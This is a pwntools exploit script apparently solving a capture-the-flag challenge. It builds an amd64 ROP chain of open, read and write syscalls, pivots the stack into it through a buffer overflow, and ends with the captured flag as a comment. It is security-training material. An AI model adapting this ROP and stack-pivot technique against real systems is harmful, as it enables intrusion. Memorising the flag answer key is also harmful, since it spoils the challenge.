from pwn import *
context.arch = 'amd64'
r = remote("edu-ctf.zoolab.org", 10005)
filename = b'/home/chal/flag\x00'

# r = process("./share/chal")
# filename = b'./share/flag\x00'

name_addr = 0x4e3340
open_rax = 2
open_rdi = name_addr
open_rsi = 0

read_rax = 0
read_rdi = 3 # fd
read_rsi = name_addr
read_rdx = 0x30

write_rax = 1
write_rdi = 1
write_rsi = name_addr
write_rdx = 0x30

pop_rdi_ret = 0x4038b3 # pop rdi ; ret
pop_rsi_ret = 0x402428 # pop rsi ; ret
pop_rax_ret = 0x45db87 # pop rax ; ret
pop_rdx_ret = 0x493a2b # pop rdx ; pop rbx ; ret
syscall_ret = 0x4284b6 # syscall ; ret
leave_ret   = 0x40190c # leave ; ret


ROP = b'A'*8 # second leave will pop this to rbp
ROP += flat(
    pop_rdi_ret, open_rdi,
    pop_rsi_ret, open_rsi,
    pop_rax_ret, open_rax,
    syscall_ret,
    pop_rdi_ret, read_rdi,
    pop_rsi_ret, read_rsi,
    pop_rdx_ret, read_rdx,
    read_rdx, # rbx
    pop_rax_ret, read_rax,
    syscall_ret,
    pop_rdi_ret, write_rdi,
    pop_rsi_ret, write_rsi,
    pop_rdx_ret, write_rdx,
    write_rdx, # rbx
    pop_rax_ret, write_rax,
    syscall_ret,
)

ROP_addr = 0x4e3360
overflow = b'A'*0x20 + p64(ROP_addr) + p64(leave_ret)
# the actual allocated space for overflow is 0x20 and not 0x10

r.sendafter("Give me filename: ", filename)
r.sendafter("Give me ROP: ", ROP)
r.sendafter("Give me overflow: ", overflow)

r.interactive()

# FLAG{banana_72b302bf297a228a75730123efef7c41}